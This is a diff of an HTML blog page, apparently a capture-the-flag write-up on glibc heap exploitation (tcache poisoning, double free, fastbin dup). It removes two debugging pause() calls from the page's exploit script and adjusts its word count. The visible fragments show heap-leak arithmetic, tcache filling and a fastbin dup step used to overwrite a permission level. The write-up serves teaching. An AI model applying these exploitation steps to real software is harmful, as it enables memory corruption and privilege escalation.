@@ -98,7 +98,7 @@
     "keywords": ["heap","cpp","tcache poisoning","double free","fastbin dup"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1990"
+    "wordCount": "1988"
   }]
   </script>
 
@@ -1366,11 +1366,9 @@ we could overwrite our user permission level.</p>
 </span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">heap</span><span class="si">=:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">user_chunk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x370</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Fill up tcachebins</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)]</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;quit&#34;</span><span class="p">])</span>
 </span></span><span class="line"><span class="cl"><span class="n">scream</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># fastbin dup</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
